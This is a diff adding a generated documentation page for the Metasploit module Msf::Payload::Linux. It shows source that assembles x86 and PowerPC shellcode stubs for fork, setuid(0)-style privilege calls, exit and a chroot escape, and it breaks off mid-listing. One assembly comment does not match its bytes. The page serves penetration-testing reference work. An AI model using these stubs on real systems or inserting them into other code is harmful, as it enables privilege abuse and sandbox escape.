@@ -1,0 +1,1119 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>
+  Module: Msf::Payload::Linux
+  
+    &mdash; Documentation by YARD 0.9.26
+  
+</title>
+
+  <link rel="stylesheet" href="../../css/style.css" type="text/css" />
+
+  <link rel="stylesheet" href="../../css/common.css" type="text/css" />
+
+<script type="text/javascript">
+  pathId = "Msf::Payload::Linux";
+  relpath = '../../';
+</script>
+
+
+  <script type="text/javascript" charset="utf-8" src="../../js/jquery.js"></script>
+
+  <script type="text/javascript" charset="utf-8" src="../../js/app.js"></script>
+
+
+  </head>
+  <body>
+    <div class="nav_wrap">
+      <iframe id="nav" src="../../class_list.html?1"></iframe>
+      <div id="resizer"></div>
+    </div>
+
+    <div id="main" tabindex="-1">
+      <div id="header">
+        <div id="menu">
+  
+    <a href="../../_index.html">Index (L)</a> &raquo;
+    <span class='title'><span class='object_link'><a href="../../Msf.html" title="Msf (module)">Msf</a></span></span> &raquo; <span class='title'><span class='object_link'><a href="../Payload.html" title="Msf::Payload (class)">Payload</a></span></span>
+     &raquo; 
+    <span class="title">Linux</span>
+  
+</div>
+
+        <div id="search">
+  
+    <a class="full_list_link" id="class_list_link"
+        href="../../class_list.html">
+
+        <svg width="24" height="24">
+          <rect x="0" y="4" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="12" width="24" height="4" rx="1" ry="1"></rect>
+          <rect x="0" y="20" width="24" height="4" rx="1" ry="1"></rect>
+        </svg>
+    </a>
+  
+</div>
+        <div class="clear"></div>
+      </div>
+
+      <div id="content"><h1>Module: Msf::Payload::Linux
+  
+  
+  
+</h1>
+<div class="box_info">
+  
+
+  
+  
+  
+  
+  
+
+  
+  <dl>
+    <dt>Included in:</dt>
+    <dd><span class='object_link'><a href="Linux/BindTcp.html" title="Msf::Payload::Linux::BindTcp (module)">BindTcp</a></span>, <span class='object_link'><a href="Linux/ReverseTcp_x64.html" title="Msf::Payload::Linux::ReverseTcp_x64 (module)">ReverseTcp_x64</a></span>, <span class='object_link'><a href="Linux/ReverseTcp_x86.html" title="Msf::Payload::Linux::ReverseTcp_x86 (module)">ReverseTcp_x86</a></span></dd>
+  </dl>
+  
+
+  
+  <dl>
+    <dt>Defined in:</dt>
+    <dd>lib/msf/core/payload/linux.rb</dd>
+  </dl>
+  
+</div>
+
+<h2>Overview</h2><div class="docstring">
+  <div class="discussion">
+    
+<p>This class is here to implement advanced features for linux-based payloads. Linux payloads are expected to include this module if they want to support these features.</p>
+
+
+  </div>
+</div>
+<div class="tags">
+  
+
+</div><h2>Defined Under Namespace</h2>
+<p class="children">
+  
+    
+      <strong class="modules">Modules:</strong> <span class='object_link'><a href="Linux/BindTcp.html" title="Msf::Payload::Linux::BindTcp (module)">BindTcp</a></span>, <span class='object_link'><a href="Linux/ReverseTcp_x64.html" title="Msf::Payload::Linux::ReverseTcp_x64 (module)">ReverseTcp_x64</a></span>, <span class='object_link'><a href="Linux/ReverseTcp_x86.html" title="Msf::Payload::Linux::ReverseTcp_x86 (module)">ReverseTcp_x86</a></span>, <span class='object_link'><a href="Linux/SendUUID.html" title="Msf::Payload::Linux::SendUUID (module)">SendUUID</a></span>
+    
+  
+    
+  
+</p>
+
+
+
+
+
+
+
+  
+    <h2>
+      Instance Method Summary
+      <small><a href="#" class="summary_toggle">collapse</a></small>
+    </h2>
+
+    <ul class="summary">
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#apply_prepends-instance_method" title="#apply_prepends (instance method)">#<strong>apply_prepends</strong>(buf)  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'></div></span>
+  
+</li>
+
+      
+        <li class="public ">
+  <span class="summary_signature">
+    
+      <a href="#initialize-instance_method" title="#initialize (instance method)">#<strong>initialize</strong>(info = {})  &#x21d2; Object </a>
+    
+
+    
+  </span>
+  
+  
+  
+  
+  
+  
+  
+
+  
+    <span class="summary_desc"><div class='inline'>
+<p>This mixin is chained within payloads that target the Linux platform.</p>
+</div></span>
+  
+</li>
+
+      
+    </ul>
+  
+
+
+
+  <div id="instance_method_details" class="method_details_list">
+    <h2>Instance Method Details</h2>
+
+    
+      <div class="method_details first">
+  <h3 class="signature first" id="apply_prepends-instance_method">
+  
+    #<strong>apply_prepends</strong>(buf)  &#x21d2; <tt>Object</tt> 
+  
+
+  
+
+  
+</h3><table class="source_code">
+  <tr>
+    <td>
+      <pre class="lines">
+
+
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148
+149
+150
+151
+152
+153
+154
+155
+156
+157
+158
+159
+160
+161
+162
+163
+164
+165
+166
+167
+168
+169
+170
+171
+172
+173
+174
+175
+176
+177
+178
+179
+180
+181
+182
+183
+184
+185
+186
+187
+188
+189
+190
+191
+192
+193
+194
+195
+196
+197
+198
+199
+200
+201
+202
+203
+204
+205
+206
+207
+208
+209
+210
+211
+212
+213
+214
+215
+216
+217
+218
+219
+220
+221
+222
+223
+224
+225
+226
+227
+228
+229
+230
+231
+232
+233
+234
+235
+236
+237
+238
+239
+240
+241
+242
+243
+244
+245
+246
+247
+248
+249
+250
+251
+252
+253
+254
+255
+256
+257
+258
+259
+260
+261
+262
+263
+264
+265
+266
+267
+268
+269
+270
+271
+272
+273
+274
+275
+276
+277
+278
+279
+280
+281
+282
+283
+284
+285
+286
+287
+288
+289
+290
+291
+292
+293
+294
+295
+296
+297
+298
+299
+300
+301
+302
+303
+304
+305
+306
+307
+308
+309
+310
+311
+312
+313
+314
+315
+316
+317
+318
+319
+320
+321
+322
+323
+324
+325
+326
+327
+328
+329
+330
+331
+332
+333
+334
+335
+336
+337
+338
+339
+340
+341
+342
+343
+344
+345
+346
+347
+348
+349
+350
+351
+352
+353
+354
+355
+356
+357
+358
+359
+360
+361
+362
+363
+364
+365
+366
+367
+368
+369
+370
+371
+372
+373
+374
+375
+376
+377
+378
+379
+380
+381
+382
+383
+384
+385
+386
+387
+388
+389
+390
+391
+392
+393
+394
+395
+396
+397
+398
+399
+400
+401
+402
+403
+404
+405
+406
+407
+408
+409
+410
+411
+412
+413
+414
+415
+416
+417
+418
+419
+420
+421
+422
+423
+424
+425
+426
+427
+428
+429
+430
+431
+432
+433
+434
+435
+436
+437
+438
+439
+440
+441
+442
+443
+444
+445
+446
+447
+448
+449</pre>
+    </td>
+    <td>
+      <pre class="code"><span class="info file"># File 'lib/msf/core/payload/linux.rb', line 103</span>
+
+<span class='kw'>def</span> <span class='id identifier rubyid_apply_prepends'>apply_prepends</span><span class='lparen'>(</span><span class='id identifier rubyid_buf'>buf</span><span class='rparen'>)</span>
+  <span class='id identifier rubyid_pre'>pre</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+  <span class='id identifier rubyid_app'>app</span> <span class='op'>=</span> <span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_end'>&#39;</span></span>
+
+  <span class='id identifier rubyid_test_arch'>test_arch</span> <span class='op'>=</span> <span class='lbracket'>[</span> <span class='op'>*</span><span class='lparen'>(</span><span class='kw'>self</span><span class='period'>.</span><span class='id identifier rubyid_arch'>arch</span><span class='rparen'>)</span> <span class='rbracket'>]</span>
+
+  <span class='comment'># Handle all x86 code here
+</span>  <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_test_arch'>test_arch</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='const'>ARCH_X86</span><span class='rparen'>)</span><span class='rparen'>)</span>
+
+    <span class='comment'># Prepend
+</span>
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependFork</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x02</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   pushb   $0x2                       #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='op'>+</span> <span class='comment'>#   popl    %eax                       #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xcd\x80</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   int     $0x80       ; fork         #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x85\xc0</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   test    %eax,%eax                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x74\x06</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   jz      0xf                        #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xc0</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xor     %eax,%eax                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xb0\x01</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   movb    $0x1,%al    ; exit         #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xcd\x80</span><span class='tstring_end'>&quot;</span></span>               <span class='comment'>#   int     $0x80                      #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetresuid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setresuid(0, 0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xc9</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xorl    %ecx,%ecx                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xdb</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xorl    %ebx,%ebx                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xf7\xe3</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   mull    %ebx                       #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xb0\xa4</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   movb    $0xa4,%al                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xcd\x80</span><span class='tstring_end'>&quot;</span></span>               <span class='comment'>#   int     $0x80                      #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetreuid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setreuid(0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xc9</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xorl    %ecx,%ecx                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xdb</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xorl    %ebx,%ebx                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x46</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   pushl   $0x46                      #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='op'>+</span> <span class='comment'>#   popl    %eax                       #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xcd\x80</span><span class='tstring_end'>&quot;</span></span>               <span class='comment'>#   int     $0x80                      #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetuid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setuid(0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xdb</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xorl    %ebx,%ebx                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x17</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   pushl   $0x17                      #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='op'>+</span> <span class='comment'>#   popl    %eax                       #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xcd\x80</span><span class='tstring_end'>&quot;</span></span>               <span class='comment'>#   int     $0x80                      #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetresgid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setresgid(0, 0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xc9</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xorl    %ecx,%ecx                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xdb</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xorl    %ebx,%ebx                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xf7\xe3</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   mull    %ebx                       #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xb0\xaa</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   movb    $0xaa,%al                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xcd\x80</span><span class='tstring_end'>&quot;</span></span>               <span class='comment'>#   int     $0x80                      #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetregid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setregid(0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xc9</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xorl    %ecx,%ecx                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xdb</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xorl    %ebx,%ebx                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x47</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   pushl   $0x47                      #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='op'>+</span> <span class='comment'>#   popl    %eax                       #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xcd\x80</span><span class='tstring_end'>&quot;</span></span>               <span class='comment'>#   int     $0x80                      #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetgid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setgid(0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xdb</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xorl    %ebx,%ebx                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x2e</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   pushl   $0x2e                      #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='op'>+</span> <span class='comment'>#   popl    %eax                       #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xcd\x80</span><span class='tstring_end'>&quot;</span></span>               <span class='comment'>#   int     $0x80                      #
+</span>    <span class='kw'>end</span>
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependChrootBreak</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setreuid(0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xc9</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xorl    %ecx,%ecx                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xdb</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xorl    %ebx,%ebx                  #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x46</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   pushl   $0x46                      #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='op'>+</span> <span class='comment'>#   popl    %eax                       #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xcd\x80</span><span class='tstring_end'>&quot;</span></span>               <span class='comment'>#   int     $0x80                      #
+</span>
+      <span class='comment'># break chroot
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x3d</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   pushl  $0x3d                       #
+</span>           <span class='comment'># build dir str (ptr in ebx)
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x89\xe3</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   movl   %esp,%ebx                   #
+</span>           <span class='comment'># mkdir(dir)
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x27</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   pushl  $0x27                       #
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='op'>+</span> <span class='comment'>#   popl   %eax                        #
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xcd\x80</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   int     $0x80                      #
+</span>           <span class='comment'># chroot(dir)
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x89\xd9</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   movl   %ebx,%ecx                   #
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='op'>+</span> <span class='comment'>#   popl   %eax                        #
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xcd\x80</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   int     $0x80                      #
+</span>           <span class='comment'># build &quot;..&quot; str (ptr in ebx)
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xc0</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xorl   %eax,%eax                   #
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x50</span><span class='tstring_end'>&quot;</span></span>                 <span class='op'>+</span> <span class='comment'>#   pushl  %eax                        #
+</span>
+           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x66\x68\x2e\x2e</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   pushw  $0x2e2e                     #
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x89\xe3</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   movl   %esp,%ebx                   #
+</span>           <span class='comment'># loop changing dir
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x3d</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   pushl  $0x1e                       #
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x59</span><span class='tstring_end'>&quot;</span></span>                 <span class='op'>+</span> <span class='comment'>#   popl   %ecx                        #
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xb0\x0c</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   movb   $0xc,%al                    #
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xcd\x80</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   int     $0x80                      #
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xe2\xfa</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   loop   -6                          #
+</span>           <span class='comment'># final chroot
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x3d</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   pushl  $0x3d                       #
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x89\xd9</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   movl   %ebx,%ecx                   #
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='op'>+</span> <span class='comment'>#   popl   %eax                        #
+</span>           <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xcd\x80</span><span class='tstring_end'>&quot;</span></span>               <span class='comment'>#   int     $0x80                      #
+</span>
+    <span class='kw'>end</span>
+
+    <span class='comment'># Append exit(0)
+</span>
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>AppendExit</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='id identifier rubyid_app'>app</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x31\xdb</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   xorl    %ebx,%ebx                  #
+</span>        <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x6a\x01</span><span class='tstring_end'>&quot;</span></span>             <span class='op'>+</span> <span class='comment'>#   pushl   $0x01                      #
+</span>        <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x58</span><span class='tstring_end'>&quot;</span></span>                 <span class='op'>+</span> <span class='comment'>#   popl    %eax                       #
+</span>        <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\xcd\x80</span><span class='tstring_end'>&quot;</span></span>              <span class='comment'>#   int     $0x80                      #
+</span>    <span class='kw'>end</span>
+
+  <span class='comment'># Handle all Power/CBEA code here
+</span>  <span class='kw'>elsif</span> <span class='lparen'>(</span><span class='id identifier rubyid_test_arch'>test_arch</span><span class='period'>.</span><span class='id identifier rubyid_include?'>include?</span><span class='lparen'>(</span><span class='lbracket'>[</span> <span class='const'>ARCH_PPC</span><span class='comma'>,</span> <span class='const'>ARCH_PPC64</span><span class='comma'>,</span> <span class='const'>ARCH_CBEA</span><span class='comma'>,</span> <span class='const'>ARCH_CBEA64</span> <span class='rbracket'>]</span><span class='rparen'>)</span><span class='rparen'>)</span>
+
+    <span class='comment'># Prepend
+</span>
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetresuid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setresuid(0, 0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x3b\xe0\x01\xff</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   li      r31,511                    #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\xa5\x2a\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r5,r5,r5                   #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x84\x22\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r4,r4,r4                   #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x63\x1a\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r3,r3,r3                   #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x38\x1f\xfe\xa5</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   addi    r0,r31,-347                #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x44\xff\xff\x02</span><span class='tstring_end'>&quot;</span></span>       <span class='comment'>#   sc                                 #
+</span>    <span class='kw'>end</span>
+
+    <span class='kw'>if</span> <span class='lparen'>(</span><span class='id identifier rubyid_datastore'>datastore</span><span class='lbracket'>[</span><span class='tstring'><span class='tstring_beg'>&#39;</span><span class='tstring_content'>PrependSetreuid</span><span class='tstring_end'>&#39;</span></span><span class='rbracket'>]</span><span class='rparen'>)</span>
+      <span class='comment'># setreuid(0, 0)
+</span>      <span class='id identifier rubyid_pre'>pre</span> <span class='op'>&lt;&lt;</span> <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x3b\xe0\x01\xff</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   li      r31,511                    #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x84\x22\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r4,r4,r4                   #
+</span>             <span class='tstring'><span class='tstring_beg'>&quot;</span><span class='tstring_content'>\x7c\x63\x1a\x78</span><span class='tstring_end'>&quot;</span></span>     <span class='op'>+</span> <span class='comment'>#   xor     r3,r3,r3                   #
